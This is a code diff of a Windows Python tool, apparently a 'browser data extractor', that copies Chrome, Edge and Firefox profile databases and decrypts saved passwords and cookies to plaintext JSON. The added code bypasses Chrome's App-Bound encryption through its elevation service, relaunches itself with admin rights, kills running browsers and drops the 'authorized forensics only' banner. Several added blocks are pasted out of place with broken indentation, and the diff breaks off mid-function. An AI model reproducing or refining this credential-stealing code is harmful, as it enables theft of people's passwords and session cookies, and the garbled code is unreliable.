@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import os
 import json
 import base64
@@ -15,8 +16,8 @@ from typing import List, Dict, Any, Optional, Tuple
 from datetime import datetime, timedelta
 import websocket
 import requests
-from Cryptodome.Cipher import AES
-from Cryptodome.Util.Padding import unpad
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
 import win32crypt
 import psutil
 import glob
@@ -32,6 +33,9 @@ from pyasn1.type import useful
 import struct
 from dataclasses import dataclass
 from enum import Enum
+import sys
+import ctypes
+from ctypes import wintypes
 
 # Configure logging
 logging.basicConfig(
@@ -60,14 +64,15 @@ class BrowserConfig:
 
 # Enhanced browser configurations with registry detection paths
 BROWSER_CONFIGS = {
+    # Chromium-based browsers
     "chrome": BrowserConfig(
         name="Google Chrome",
         user_data=os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
         executable=os.path.join(os.environ["PROGRAMFILES"], "Google", "Chrome", "Application", "chrome.exe"),
         type=BrowserType.CHROMIUM,
         registry_paths=[
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
-            r"SOFTWARE\Clients\StartMenuInternet\Google Chrome"
+            r"SOFTWARE\\Microsoft\Windows\\CurrentVersion\\App Paths\\chrome.exe",
+            r"SOFTWARE\\Clients\\StartMenuInternet\\Google Chrome"
         ],
         portable_paths=["chrome.exe", "GoogleChromePortable.exe"]
     ),
@@ -77,8 +82,8 @@ BROWSER_CONFIGS = {
         executable=os.path.join(os.environ["PROGRAMFILES(X86)"], "Microsoft", "Edge", "Application", "msedge.exe"),
         type=BrowserType.CHROMIUM,
         registry_paths=[
-            r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",
-            r"SOFTWARE\Clients\StartMenuInternet\Microsoft Edge"
+            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe",
+            r"SOFTWARE\\Clients\\StartMenuInternet\\Microsoft Edge"
         ],
         portable_paths=["msedge.exe", "MicrosoftEdgePortable.exe"]
     ),
@@ -126,6 +131,7 @@ BROWSER_CONFIGS = {
         ],
         portable_paths=["vivaldi.exe", "VivaldiPortable.exe"]
     ),
+    # Firefox-based browsers
     "firefox": BrowserConfig(
         name="Mozilla Firefox",
         user_data=os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles"),
@@ -154,6 +160,7 @@ BROWSER_CONFIGS = {
         ],
         portable_paths=["waterfox.exe"]
     ),
+    # Legacy browsers
     "internet_explorer": BrowserConfig(
         name="Internet Explorer",
         user_data=None,  # Registry-based
@@ -162,9 +169,12 @@ BROWSER_CONFIGS = {
         registry_paths=[
             r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\iexplore.exe"
         ]
-    ),
+    )
 }
 
+class ExtractionError(Exception):
+    """Custom exception for extraction errors"""
+    pass
 
 class BrowserDataExtractor:
     def __init__(self, custom_paths: Dict[str, str] = None):
@@ -182,14 +192,124 @@ class BrowserDataExtractor:
             "errors": 0
         }
         
-        print(f"{Fore.CYAN}Windows Universal Browser Data Extractor - Enhanced Version)
-        print(f"{Fore.CYAN}{'='*60})
-        print(f"{Fore.YELLOW}FOR AUTHORIZED DIGITAL FORENSICS AND ACADEMIC RESEARCH ONLY)
-        print()
+        # Create output directory with proper structure
+        self.output_base_dir = "browser_data_extraction"
+        self.ensure_output_structure()
+        
+        # CRITICAL CHANGE: Use user profile TEMP directory for all temporary copies
+        self.temp_base_path = os.path.join(os.environ['USERPROFILE'], 'TEMP')
+        if not os.path.exists(self.temp_base_path):
+            os.makedirs(self.temp_base_path, exist_ok=True)
+        
         
         self.installed_browsers = self.detect_installed_browsers()
-        print(f"{Fore.GREEN}Detected {len(self.installed_browsers)} installed browsers)
         
+    def is_admin(self) -> bool:
+        """Check if the script is running with administrator privileges"""
+        try:
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+    
+    def elevate_privileges(self):
+        """Attempt to restart the script with elevated privileges"""
+        if self.is_admin():
+            return True
+            
+        try:
+            # Get the path to the current script
+            script_path = os.path.abspath(sys.argv[0])
+            if not os.path.exists(script_path):
+                script_path = sys.executable
+                
+            # Use ShellExecute to restart with elevation
+            ctypes.windll.shell32.ShellExecuteW(
+                None,
+                "runas",  # Verb for elevation
+                script_path,
+                " ".join(f'"{arg}"' for arg in sys.argv),
+                None,
+                1  # SW_SHOWNORMAL
+            )
+            return False
+        except Exception as e:
+            logger.error(f"Failed to elevate privileges: {e}")
+            return False
+    
+    def create_vss_snapshot(self, volume_path: str) -> Optional[str]:
+        """Create a Volume Shadow Copy Service snapshot"""
+        try:
+            # Use vshadow.exe to create a shadow copy (more reliable than vssadmin)
+            vss_cmd = f'vshadow.exe -p {volume_path}'
+            result = subprocess.run(vss_cmd, shell=True, capture_output=True, text=True)
+            
+            if result.returncode != 0:
+                logger.error(f"VSS creation failed: {result.stderr}")
+                return None
+                
+            # Parse the output to get the shadow copy path
+            for line in result.stdout.split('\n'):
+                if '->' in line and ':' in line:
+                    shadow_path = line.split('->')[-1].strip()
+                    if os.path.exists(shadow_path):
+                        return shadow_path
+                        
+            return None
+        except Exception as e:
+            logger.error(f"VSS snapshot creation failed: {e}")
+            return None
+    
+    def detect_running_browsers(self) -> List[str]:
+        """Detect running browser processes using psutil"""
+        browsers_to_terminate = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe", "firefox.exe"]
+        running_browsers = []
+        
+        for process in psutil.process_iter(['name']):
+            try:
+                if process.info['name'].lower() in [b.lower() for b in browsers_to_terminate]:
+                    running_browsers.append(process.info['name'])
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                continue
+        
+        return list(set(running_browsers))  # Remove duplicates
+    
+    def terminate_browser_processes(self, browser_names: List[str]) -> bool:
+        """Terminate running browser processes using psutil"""
+        terminated = False
+        for process in psutil.process_iter(['pid', 'name']):
+            try:
+                if process.info['name'].lower() in [name.lower() for name in browser_names]:
+                    print(f"Terminating browser process: {process.info['name']} (PID: {process.info['pid']})")
+                    process.terminate()  # Graceful termination first
+                    try:
+                        process.wait(timeout=5)  # Wait up to 5 seconds for graceful shutdown
+                    except psutil.TimeoutExpired:
+                        print(f"Force killing browser process: {process.info['name']} (PID: {process.info['pid']})")
+                        process.kill()  # Force kill if graceful termination fails
+                    terminated = True
+                    time.sleep(1)  # Give it time to terminate
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                continue
+        return terminated
+    
+    def ensure_output_structure(self):
+        """Create the proper output directory structure: BROWSER_NAME/data_types/"""
+        if not os.path.exists(self.output_base_dir):
+            os.makedirs(self.output_base_dir)
+            
+        # Create subdirectories for each browser type
+        for browser_id, config in BROWSER_CONFIGS.items():
+            browser_dir = os.path.join(self.output_base_dir, config.name)
+            if not os.path.exists(browser_dir):
+                os.makedirs(browser_dir)
+                
+            # Create data type subdirectories
+            data_types = ["cookies", "history", "passwords", "bookmarks", "downloads"]
+            for data_type in data_types:
+                data_dir = os.path.join(browser_dir, data_type)
+                if not os.path.exists(data_dir):
+                    os.makedirs(data_dir)
+    
     def detect_installed_browsers(self) -> List[str]:
         """Enhanced browser detection using registry and file system"""
         installed = []
@@ -201,7 +321,7 @@ class BrowserDataExtractor:
             if browser_id in self.custom_paths:
                 custom_path = self.custom_paths[browser_id]
                 if os.path.exists(custom_path):
-                    print(f"{Fore.GREEN}Found {config.name} at custom path: {custom_path})
+                    print(f"Found {config.name} at custom path: {custom_path}")
                     installed.append(browser_id)
                     # Update the config executable path
                     config.executable = custom_path
@@ -210,7 +330,7 @@ class BrowserDataExtractor:
             
             # Check by executable existence
             if config.executable and os.path.exists(config.executable):
-                print(f"{Fore.GREEN}Found {config.name} at: {config.executable})
+                print(f"Found {config.name} at: {config.executable}")
                 installed.append(browser_id)
                 detected = True
                 continue
@@ -219,19 +339,10 @@ class BrowserDataExtractor:
             if config.registry_paths:
                 for reg_path in config.registry_paths:
                     if self._check_registry_browser(reg_path):
-                        print(f"{Fore.GREEN}Found {config.name} in registry: {reg_path})
+                        print(f"Found {config.name} in registry: {reg_path}")
                         installed.append(browser_id)
                         detected = True
                         break
-            
-            # Check for portable browsers in common locations
-            if not detected and config.portable_paths:
-                portable_found = self._find_portable_browser(config.portable_paths)
-                if portable_found:
-                    print(f"{Fore.GREEN}Found portable {config.name} at: {portable_found})
-                    installed.append(browser_id)
-                    config.executable = portable_found
-                    detected = True
         
         return installed
     
@@ -254,28 +365,6 @@ class BrowserDataExtractor:
         
         return False
     
-    def _find_portable_browser(self, portable_names: List[str]) -> Optional[str]:
-        """Search for portable browsers in common locations"""
-        search_paths = [
-            os.path.join(os.environ["PROGRAMFILES"], "PortableApps"),
-            os.path.join(os.environ["PROGRAMFILES(X86)"], "PortableApps"),
-            os.path.join(os.environ["USERPROFILE"], "Desktop"),
-            os.path.join(os.environ["USERPROFILE"], "Downloads"),
-            "C:\\PortableApps",
-            "D:\\PortableApps",
-            "E:\\PortableApps"
-        ]
-        
-        for search_path in search_paths:
-            if not os.path.exists(search_path):
-                continue
-                
-            for root, dirs, files in os.walk(search_path):
-                for portable_name in portable_names:
-                    if portable_name in files:
-                        return os.path.join(root, portable_name)
-        
-        return None
     
     def get_chromium_profiles(self, user_data_path: str) -> List[str]:
         """Get all Chromium browser profiles with enhanced detection"""
@@ -313,16 +402,94 @@ class BrowserDataExtractor:
         return profiles
     
     def get_chromium_master_key(self, user_data_path: str) -> bytes:
-        """Get the master key for Chromium browsers with error handling"""
-        local_state_path = os.path.join(user_data_path, "Local State")
         try:
             with open(local_state_path, 'r', encoding='utf-8') as f:
                 local_state = json.load(f)
+                
+                if 'os_crypt' in local_state and 'app_bound_encrypted_key' in local_state['os_crypt']:
+                    logger.info("Using AppBound encryption key (Chrome 127+)")
             
+            # Get the base64-encoded AppBound key
+            enc_key_b64 = local_state['os_crypt']['app_bound_encrypted_key']
+            enc_key = base64.b64decode(enc_key_b64)
+            
+            # Decrypt using COM service
+            decrypted_key = self.appbound_decryptor.decrypt_app_bound_key(local_state_path)
+            
+            if decrypted_key:
+                # For AppBound encryption, extract the 32-byte AES key
+                if len(decrypted_key) >= 32:
+                    logger.info(f"Successfully decrypted AppBound key ({len(decrypted_key)} -> 32 bytes)")
+                    return decrypted_key[:32]
+                else:
+                    logger.warning(f"AppBound key too short: {len(decrypted_key)} bytes")
+                    return decrypted_key
+            else:
+                # Fallback to direct DPAPI if COM fails
+                logger.warning("COM service failed, attempting direct DPAPI")
+                try:
+                    decrypted = win32crypt.CryptUnprotectData(enc_key, None, None, None, None)[1]
+                    if len(decrypted) >= 32:
+                        return decrypted[:32]
+                    return decrypted
+                except Exception as e:
+                    logger.error(f"Direct DPAPI failed: {e}")
+                    raise ExtractionError("AppBound key decryption failed")
+
+        # Fallback to legacy encrypted_key
+        elif 'os_crypt' in local_state and 'encrypted_key' in local_state['os_crypt']:
+            logger.info("Using legacy encryption key")
             encrypted_key = local_state["os_crypt"]["encrypted_key"]
             encrypted_key = base64.b64decode(encrypted_key)
             
-            return encrypted_key[5:]  # Remove DPAPI prefix
+            # Remove DPAPI prefix
+            if encrypted_key.startswith(b'DPAPI'):
+                encrypted_key = encrypted_key[5:]
+            
+            # Decrypt with DPAPI
+            decrypted = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, None)[1]
+            return decrypted
+        else:
+            raise ExtractionError("No encryption key found in Local State")
+            
+    except Exception as e:
+        logger.error(f"Failed to get Chromium master key: {e}")
+        raise ExtractionError(f"Master key extraction failed: {e}")
+
+                try:
+                    import ctypes
+                    import win32com.client
+                    def decrypt_app_bound_key(local_state_path: str) -> bytes:
+    """Decrypt AppBound key using GoogleChromeElevationService"""
+    # Read encrypted key from Local State
+    with open(local_state_path, 'r') as f:
+        data = json.load(f)
+    enc_key_b64 = data['os_crypt']['app_bound_encrypted_key']
+    enc_key = base64.b64decode(enc_key_b64)
+    
+    # Access the elevation service (requires SYSTEM or Chrome folder)
+    clsid = "{708860E0-F641-4611-8895-7D867DD3675B}"
+    service = win32com.client.Dispatch(clsid)
+    
+    # Decrypt the key
+    plaintext = service.DecryptData(enc_key)
+    return plaintext
+            
+            # Fallback to legacy encrypted_key
+            elif 'os_crypt' in local_state and 'encrypted_key' in local_state['os_crypt']:
+                logger.info("Using legacy encryption key")
+                encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                encrypted_key = base64.b64decode(encrypted_key)
+                
+                # Remove DPAPI prefix (first 5 bytes: "DPAPI")
+                if encrypted_key.startswith(b'DPAPI'):
+                    return encrypted_key[5:]  # Remove DPAPI prefix
+                else:
+                    logger.warning("No DPAPI prefix found in encrypted key")
+                    return encrypted_key
+            else:
+                raise ExtractionError("No encryption key found in Local State")
+                
         except Exception as e:
             logger.error(f"Failed to get Chromium master key: {e}")
             raise ExtractionError(f"Master key extraction failed: {e}")
@@ -336,40 +503,79 @@ class BrowserDataExtractor:
             raise ExtractionError(f"DPAPI decryption failed: {e}")
     
     def decrypt_chromium_value(self, encrypted_value: bytes, master_key: bytes) -> str:
-        """Decrypt an encrypted Chromium browser value with enhanced error handling"""
-        if not encrypted_value:
-            return ""
-        
-        try:
-            if encrypted_value[:3] in (b'v10', b'v11'):
-                nonce = encrypted_value[3:3+12]
-                ciphertext = encrypted_value[3+12:]
-                
-                cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
-                decrypted = cipher.decrypt(ciphertext)
-                return decrypted.decode('utf-8')
-            else:
-                return self.decrypt_with_dpapi(encrypted_value).decode('utf-8')
-        except Exception as e:
-            logger.warning(f"Failed to decrypt Chromium value: {e}")
-            return ""
+    """Decrypt an encrypted Chromium browser value with AppBound v20 support"""
+    if not encrypted_value:
+        return ""
     
-    def _create_forensic_copy(self, source_path: str, temp_dir: str) -> str:
-        """Create a forensic copy of the database file"""
+    try:
+        # Check for v20 prefix (Chrome 127+ with AppBound + host hash)
+        if encrypted_value[:3] == b'v20':
+            nonce = encrypted_value[3:3+12]
+            ciphertext = encrypted_value[3+12:-16]
+            tag = encrypted_value[-16:]
+            
+            # Ensure master_key is exactly 32 bytes for AES-256
+            if len(master_key) != 32:
+                logger.warning(f"Master key length is {len(master_key)}, expected 32 bytes")
+                if len(master_key) > 32:
+                    master_key = master_key[:32]
+                else:
+                    # Pad with zeros if too short
+                    master_key = master_key.ljust(32, b'\0')
+            
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            
+            # For v20, strip the 32-byte host hash if present
+            if len(decrypted) > 32:
+                decrypted = decrypted[32:]
+            
+            plaintext = decrypted.decode('utf-8', errors='replace')
+            return plaintext
+        
+        # Check for v10/v11 prefix (Chrome 80-126)
+        elif encrypted_value[:3] in (b'v10', b'v11'):
+            nonce = encrypted_value[3:3+12]
+            ciphertext = encrypted_value[3+12:-16]
+            tag = encrypted_value[-16:]
+            
+            # Ensure master_key is correct length
+            if len(master_key) != 32:
+                logger.warning(f"Master key length is {len(master_key)}, expected 32 bytes")
+                if len(master_key) > 32:
+                    master_key = master_key[:32]
+                else:
+                    master_key = master_key.ljust(32, b'\0')
+            
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            plaintext = decrypted.decode('utf-8', errors='replace')
+            return plaintext
+            
+        # Fallback to DPAPI for older versions
+        else:
+            decrypted = self.appbound_decryptor._decrypt_legacy_dpapi(encrypted_value)
+            plaintext = decrypted.decode('utf-8', errors='replace')
+            return plaintext
+                
+    except Exception as e:
+        logger.warning(f"Failed to decrypt Chromium value: {e}")
+        # Better error reporting
+        if "Incorrect AES key length" in str(e):
+            return f"[DECRYPTION_FAILED:Incorrect_AES_key_length_{len(master_key)}_bytes]"
+        elif len(encrypted_value) > 288:
+            return f"[DECRYPTION_FAILED:AppBound_v20_key_too_large]"
+        return f"[DECRYPTION_FAILED:{base64.b64encode(encrypted_value).decode()[:50]}...]"
+    
+    def _create_forensic_copy(self, source_path: str) -> str:
+        """Create a forensic copy of the database file - MODIFIED to use copy2 and USERPROFILE TEMP"""
         try:
             # Generate hash of original file
             original_hash = self._calculate_file_hash(source_path)
             
-            # Create temporary copy
-            temp_path = os.path.join(temp_dir, os.path.basename(source_path))
-            shutil.copy2(source_path, temp_path)
-            
-            # Verify copy integrity
-            copy_hash = self._calculate_file_hash(temp_path)
-            if original_hash != copy_hash:
-                os.remove(temp_path)
-                raise ExtractionError("File copy integrity check failed")
-            
+            # CRITICAL CHANGE: Use copy2 to copy to USERPROFILE TEMP directory
+            temp_path = os.path.join(self.temp_base_path, f"temp_{os.path.basename(source_path)}")
+            shutil.copy2(source_path, temp_path)  # Using copy2 to preserve metadata
             return temp_path
         except Exception as e:
             logger.error(f"Failed to create forensic copy: {e}")
@@ -383,8 +589,8 @@ class BrowserDataExtractor:
                 sha256_hash.update(chunk)
         return sha256_hash.hexdigest()
     
-    def extract_chromium_cookies(self, user_data_path: str, profile: str, master_key: bytes) -> List[Dict[str, Any]]:
-        """Extract cookies from Chromium browser with forensic safety"""
+    def extract_chromium_cookies(self, user_data_path: str, profile: str, master_key: bytes, browser_name: str) -> List[Dict[str, Any]]:
+        """Extract cookies from Chromium browser with forensic safety - ALWAYS plaintext values"""
         cookies_db_path = os.path.join(user_data_path, profile, "Network", "Cookies")
         
         # Fallback for older Chrome versions
@@ -394,14 +600,20 @@ class BrowserDataExtractor:
         if not os.path.exists(cookies_db_path):
             return []
         
-        temp_dir = tempfile.mkdtemp()
         temp_db_path = None
         
         try:
-            temp_db_path = self._create_forensic_copy(cookies_db_path, temp_dir)
+            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
+            temp_db_path = self._create_forensic_copy_with_vss(cookies_db_path)
             
             conn = sqlite3.connect(temp_db_path)
             cursor = conn.cursor()
+            
+            # Check if cookies table exists
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
+            if not cursor.fetchone():
+                logger.error("cookies table not found in database")
+                return []
             
             # Get all columns to handle different Chrome versions
             cursor.execute("PRAGMA table_info(cookies)")
@@ -418,13 +630,14 @@ class BrowserDataExtractor:
                 if not row_dict.get("name") or not row_dict.get("host_key"):
                     continue
                 
+                # ALWAYS decrypt to plaintext, never return empty/black values
                 decrypted_value = self.decrypt_chromium_value(row_dict.get("encrypted_value", b""), master_key)
                 
                 cookie = {
                     "host_key": row_dict.get("host_key", ""),
                     "name": row_dict.get("name", ""),
                     "path": row_dict.get("path", ""),
-                    "value": decrypted_value,
+                    "value": decrypted_value,  # Always plaintext
                     "expires_utc": row_dict.get("expires_utc", 0),
                     "is_secure": bool(row_dict.get("is_secure", 0)),
                     "is_httponly": bool(row_dict.get("is_httponly", 0)),
@@ -442,32 +655,31 @@ class BrowserDataExtractor:
             
             cursor.close()
             conn.close()
+            
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "cookies", f"{profile}_cookies.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(cookies, f, indent=2, default=str)
+
             return cookies
         
         except Exception as e:
             logger.error(f"Failed to extract Chromium cookies: {e}")
             self.errors.append(f"Chromium cookies extraction failed: {e}")
             return []
-        
-        finally:
-            try:
-                if temp_dir and os.path.exists(temp_dir):
-                    shutil.rmtree(temp_dir)
-            except:
-                pass
     
-    def extract_chromium_history(self, user_data_path: str, profile: str) -> List[Dict[str, Any]]:
+    def extract_chromium_history(self, user_data_path: str, profile: str, browser_name: str) -> List[Dict[str, Any]]:
         """Extract history from Chromium browser with forensic safety"""
         history_db_path = os.path.join(user_data_path, profile, "History")
         
         if not os.path.exists(history_db_path):
             return []
         
-        temp_dir = tempfile.mkdtemp()
         temp_db_path = None
         
         try:
-            temp_db_path = self._create_forensic_copy(history_db_path, temp_dir)
+            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
+            temp_db_path = self._create_forensic_copy_with_vss(history_db_path)
             
             conn = sqlite3.connect(temp_db_path)
             cursor = conn.cursor()
@@ -500,6 +712,12 @@ class BrowserDataExtractor:
             
             cursor.close()
             conn.close()
+            
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "history", f"{profile}_history.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(history, f, indent=2, default=str)
+            
             return history
         
         except Exception as e:
@@ -508,24 +726,26 @@ class BrowserDataExtractor:
             return []
         
         finally:
+            # Clean up temporary copy
             try:
-                if temp_dir and os.path.exists(temp_dir):
-                    shutil.rmtree(temp_dir)
+                if temp_db_path and os.path.exists(temp_db_path):
+                    os.remove(temp_db_path)
+                    logger.debug(f"Cleaned up temporary copy: {temp_db_path}")
             except:
                 pass
     
-    def extract_chromium_passwords(self, user_data_path: str, profile: str, master_key: bytes) -> List[Dict[str, Any]]:
-        """Extract passwords from Chromium browser with forensic safety"""
+    def extract_chromium_passwords(self, user_data_path: str, profile: str, master_key: bytes, browser_name: str) -> List[Dict[str, Any]]:
+        """Extract passwords from Chromium browser with forensic safety - ALWAYS plaintext passwords"""
         login_db_path = os.path.join(user_data_path, profile, "Login Data")
         
         if not os.path.exists(login_db_path):
             return []
         
-        temp_dir = tempfile.mkdtemp()
         temp_db_path = None
         
         try:
-            temp_db_path = self._create_forensic_copy(login_db_path, temp_dir)
+            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
+            temp_db_path = self._create_forensic_copy_with_vss(login_db_path)
             
             conn = sqlite3.connect(temp_db_path)
             cursor = conn.cursor()
@@ -541,13 +761,14 @@ class BrowserDataExtractor:
                 origin_url, action_url, username_value, encrypted_password, \
                 date_created, date_last_used, blacklisted_by_user, times_used = row
                 
+                # ALWAYS decrypt to plaintext, never base64 or empty
                 decrypted_password = self.decrypt_chromium_value(encrypted_password, master_key)
                 
                 password_entry = {
                     "origin_url": origin_url,
                     "action_url": action_url,
                     "username_value": username_value,
-                    "password_value": decrypted_password,
+                    "password_value": decrypted_password,  # Always plaintext
                     "date_created": self.chrome_time_to_datetime(date_created),
                     "date_last_used": self.chrome_time_to_datetime(date_last_used),
                     "blacklisted_by_user": bool(blacklisted_by_user),
@@ -558,17 +779,77 @@ class BrowserDataExtractor:
             
             cursor.close()
             conn.close()
+            
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "passwords", f"{profile}_passwords.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(passwords, f, indent=2, default=str)
+            
             return passwords
         
         except Exception as e:
             logger.error(f"Failed to extract Chromium passwords: {e}")
             self.errors.append(f"Chromium passwords extraction failed: {e}")
             return []
+        except:
+            pass
+    
+    def extract_chromium_bookmarks(self, user_data_path: str, profile: str, browser_name: str) -> List[Dict[str, Any]]:
+        """Extract bookmarks from Chromium browser"""
+        bookmarks_path = os.path.join(user_data_path, profile, "Bookmarks")
+        
+        if not os.path.exists(bookmarks_path):
+            return []
+        
+        try:
+            # CRITICAL CHANGE: Use copy2 to copy bookmarks file to USERPROFILE TEMP before reading
+            temp_bookmarks_path = os.path.join(self.temp_base_path, f"temp_bookmarks_{profile}.json")
+            shutil.copy2(bookmarks_path, temp_bookmarks_path)  # Using copy2 to preserve metadata
+            
+            with open(temp_bookmarks_path, 'r', encoding='utf-8') as f:
+                bookmarks_data = json.load(f)
+            
+            bookmarks = []
+            
+            def extract_bookmark_folder(folder, folder_name=""):
+                if isinstance(folder, dict):
+                    if "children" in folder:
+                        for child in folder["children"]:
+                            extract_bookmark_folder(child, folder.get("name", folder_name))
+                    elif "url" in folder:
+                        bookmark = {
+                            "name": folder.get("name", ""),
+                            "url": folder.get("url", ""),
+                            "date_added": folder.get("date_added", 0),
+                            "date_modified": folder.get("date_modified", 0),
+                            "folder": folder_name
+                        }
+                        bookmarks.append(bookmark)
+            
+            # Extract from bookmark bar and other folders
+            if "roots" in bookmarks_data:
+                for root_key, root_value in bookmarks_data["roots"].items():
+                    extract_bookmark_folder(root_value, root_key)
+            
+            # Save to structured output directory
+            output_file = os.path.join(self.output_base_dir, browser_name, "bookmarks", f"{profile}_bookmarks.json")
+            with open(output_file, "w", encoding="utf-8") as f:
+                json.dump(bookmarks, f, indent=2, default=str)
+            
+            return bookmarks
+        
+        except Exception as e:
+            logger.error(f"Failed to extract Chromium bookmarks: {e}")
+            self.errors.append(f"Chromium bookmarks extraction failed: {e}")
+            return []
         
         finally:
+            # Clean up temporary copy
             try:
-                if temp_dir and os.path.exists(temp_dir):
-                    shutil.rmtree(temp_dir)
+                temp_bookmarks_path = os.path.join(self.temp_base_path, f"temp_bookmarks_{profile}.json")
+                if os.path.exists(temp_bookmarks_path):
+                    os.remove(temp_bookmarks_path)
+                    logger.debug(f"Cleaned up temporary bookmarks copy: {temp_bookmarks_path}")
             except:
                 pass
     
@@ -583,8 +864,14 @@ class BrowserDataExtractor:
                 return self._extract_master_key_key3(key3_db_path, master_password)
             return None
         
+        temp_key4_path = None
+        
         try:
-            conn = sqlite3.connect(key4_db_path)
+            # CRITICAL CHANGE: Use copy2 to copy key4.db to USERPROFILE TEMP before decrypting
+            temp_key4_path = os.path.join(self.temp_base_path, f"temp_key4.db")
+            shutil.copy2(key4_db_path, temp_key4_path)  # Using copy2 to preserve metadata
+            
+            conn = sqlite3.connect(temp_key4_path)
             cursor = conn.cursor()
             
             # Get the metadata
@@ -648,6 +935,15 @@ class BrowserDataExtractor:
             logger.error(f"Failed to extract Firefox master key: {e}")
             self.errors.append(f"Firefox master key extraction failed: {e}")
         
+        finally:
+            # Clean up temporary copy
+            try:
+                if temp_key4_path and os.path.exists(temp_key4_path):
+                    os.remove(temp_key4_path)
+                    logger.debug(f"Cleaned up temporary key4 copy: {temp_key4_path}")
+            except:
+                pass
+        
         return None
     
     def _extract_master_key_key3(self, key3_db_path: str, master_password: str) -> Optional[bytes]:
@@ -663,73 +959,155 @@ class BrowserDataExtractor:
     def _derive_nss_key(self, global_salt: bytes, entry_salt: bytes, master_password: str) -> bytes:
         """Derive NSS decryption key"""
         # This is a simplified version - full implementation follows NSS key derivation
-        import hmac
         import hashlib
+        import hmac
+        from Crypto.Cipher import DES3
+
+    class NSSDecryptor:
+    def __init__(self, master_password: str = ""):
+        self.password = master_password
+
+    def _derive_nss_key(self, global_salt: bytes, entry_salt: bytes) -> bytes:
+        """
+        Derives the 24-byte 3DES key using the NSS PKCS#11 PBE algorithm.
+        """
+        # HP = SHA1(global_salt + master_password)
+        hp = hashlib.sha1(global_salt + self.password.encode()).digest()
         
-        # SHA1 of global_salt + master_password
-        hp = hashlib.sha1(global_salt + master_password.encode()).digest()
-        
-        # HMAC-SHA1 of entry_salt + hp
+        # PES = entry_salt padded to 20 bytes with zeros
         pes = entry_salt + b'\x00' * (20 - len(entry_salt))
+        
+        # k1 = HMAC-SHA1(hp, pes)
         k1 = hmac.new(hp, pes, hashlib.sha1).digest()
         
-        # Generate final key
+        # tk = HMAC-SHA1(hp, k1 + entry_salt)
         tk = hmac.new(hp, k1 + entry_salt, hashlib.sha1).digest()
         
-        # Use first 24 bytes for 3DES key
+        # If we need 24 bytes (3DES) and only have 20, derive the remaining bytes
+        if len(tk) < 24:
+            k2 = hmac.new(hp, k1, hashlib.sha1).digest()
+            tk += k2
+            
         return tk[:24]
+
+    def decrypt(self, global_salt: bytes, entry_salt: bytes, encrypted_data: bytes) -> bytes:
+        """        Derives key and decrypts data using 3DES-CBC.
+        """
+        key = self._derive_nss_key(global_salt, entry_salt)
+        
+        # In NSS, the IV is usually the last 8 bytes of the derived key 
+        # or provided separately depending on the metadata version.
+        # This example assumes standard CBC where IV is extracted from the data or fixed.
+        iv = encrypted_data[:8]
+        cipher_text = encrypted_data[8:]
+        
+        cipher = DES3.new(key, DES3.MODE_CBC, iv)
+        decrypted = cipher.decrypt(cipher_text)
+        
+        return self._unpad(decrypted)
+
+    @staticmethod
+    def _unpad(data: bytes) -> bytes:
+        """Remove PKCS7 padding."""
+        return data[:-data[-1]]
+
+# Example Usage:
+# decryptor = NSSDecryptor("my_master_password")
+# cleartext = decryptor.decrypt(global_salt_from_db, entry_salt_from_item, encrypted_blob)
     
     def _create_3des_cipher(self, key: bytes, iv: bytes):
         """Create 3DES cipher for NSS decryption"""
         from Crypto.Cipher import DES3
         return DES3.new(key, DES3.MODE_CBC, iv)
     
-    def extract_firefox_cookies(self, profile_path: str) -> List[Dict[str, Any]]:
-        """Extract cookies from Firefox browser with forensic safety"""
+    def extract_firefox_cookies(self, profile_path: str, browser_name: str, profile: str) -> List[Dict[str, Any]]:
+        """Extract cookies from Firefox browser with forensic safety - ALWAYS plaintext values"""
         cookies_db_path = os.path.join(profile_path, "cookies.sqlite")
         
         if not os.path.exists(cookies_db_path):
             return []
         
-        temp_dir = tempfile.mkdtemp()
         temp_db_path = None
         
         try:
-            temp_db_path = self._create_forensic_copy(cookies_db_path, temp_dir)
+            # CRITICAL CHANGE: Use forensic copy with copy2 to USERPROFILE TEMP before decrypting
+            temp_db_path = self._create_forensic_copy_with_vss(cookies_db_path)
             
             conn = sqlite3.connect(temp_db_path)
             cursor = conn.cursor()
             
-            cursor.execute("""
-                SELECT originAttributes, name, value, host, path, expiry, lastAccessed,
-                       creationTime, isSecure, isHttpOnly, inBrowserElement, sameSite
-                FROM moz_cookies
-            """)
+            # Check if moz_cookies table exists
+            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='moz_cookies'")
+            if not cursor.fetchone():
+                logger.error("moz_cookies table not found in Firefox cookies database")
+                # Try alternative table names
+                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%cookie%'")
+                tables = cursor.fetchall()
+                if tables:
